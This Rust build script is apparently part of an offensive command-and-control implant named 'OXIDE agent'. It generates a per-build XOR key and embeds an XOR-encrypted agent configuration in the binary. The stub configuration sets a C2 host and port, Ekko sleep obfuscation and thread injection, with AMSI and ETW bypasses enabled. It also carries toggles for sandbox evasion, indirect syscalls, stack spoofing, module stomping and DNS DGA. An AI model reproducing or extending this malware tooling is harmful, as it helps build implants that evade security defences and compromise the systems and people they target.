//! build.rs — per-build random keys and config injection for OXIDE agent.
//!
//! Generates a unique XOR key + cipher key every compilation.
//! The builder (`oxide-server`) writes agent_key.bin / agent_cfg.bin to
//! OXIDE_OUT_DIR before invoking cargo; build.rs copies them to OUT_DIR
//! so the agent can embed them with include_bytes!.

use std::path::Path;

fn main() {
    // Allow build.rs to pick up env changes
    println!("cargo:rerun-if-env-changed=OXIDE_OUT_DIR");
    println!("cargo:rerun-if-env-changed=OXIDE_BUILD_ID");
    println!("cargo:rerun-if-env-changed=OXIDE_CIPHER_KEY");

    let out_dir  = std::env::var("OUT_DIR").unwrap();
    let src_dir  = std::env::var("OXIDE_OUT_DIR").unwrap_or_default();
    let build_id = std::env::var("OXIDE_BUILD_ID").unwrap_or_else(|_| "dev".into());

    // ── Cipher key forwarded to oxide-macros ─────────────────────────────────
    let _cipher_key = std::env::var("OXIDE_CIPHER_KEY")
        .unwrap_or_else(|_| "00".repeat(32));
    // The env var is already set for proc macros — no extra action needed here.

    // ── XOR key + encrypted config ────────────────────────────────────────────
    let key_src = Path::new(&src_dir).join("agent_key.bin");
    let cfg_src = Path::new(&src_dir).join("agent_cfg.bin");
    let key_dst = Path::new(&out_dir).join("agent_key.bin");
    let cfg_dst = Path::new(&out_dir).join("agent_cfg.bin");

    if key_src.exists() && cfg_src.exists() {
        std::fs::copy(&key_src, &key_dst).expect("copy agent_key.bin");
        std::fs::copy(&cfg_src, &cfg_dst).expect("copy agent_cfg.bin");
    } else {
        // Dev build: generate a stub config so the crate compiles standalone.
        let mut key = [0u8; 32];
        rand_fill(&mut key);

        let stub_cfg = serde_json::json!({
            "build_id":          build_id,
            "sleep_ms":          5000,
            "jitter_pct":        10,
            "sleep_obf":         "ekko",
            "injection":         "create_thread",
            "amsi_bypass":       true,
            "etw_bypass":        true,
            "sandbox_evasion":   false,
            "indirect_syscalls": false,
            "stack_spoof":       false,
            "module_stomp":      false,
            "block_dlls":        false,
            "encrypted_comms":   false,
            "dns_dga":           false,
            "server_pubkey":     "",
            "c2_host":           "127.0.0.1",
            "c2_port":           8080,
            "protocol":          "http",
        });
        let plain = serde_json::to_vec(&stub_cfg).unwrap();
        let encrypted: Vec<u8> = plain.iter().enumerate()
            .map(|(i, &b)| b ^ key[i % key.len()])
            .collect();

        std::fs::write(&key_dst, &key).expect("write agent_key.bin");
        std::fs::write(&cfg_dst, &encrypted).expect("write agent_cfg.bin");
    }

    println!("cargo:rustc-env=OXIDE_BUILD_ID={build_id}");
}

fn rand_fill(buf: &mut [u8]) {
    // LCG — no dep needed in build.rs
    let seed: u64 = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0xDEADBEEF);
    let mut state = seed;
    for b in buf.iter_mut() {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        *b = (state >> 32) as u8;
    }
}
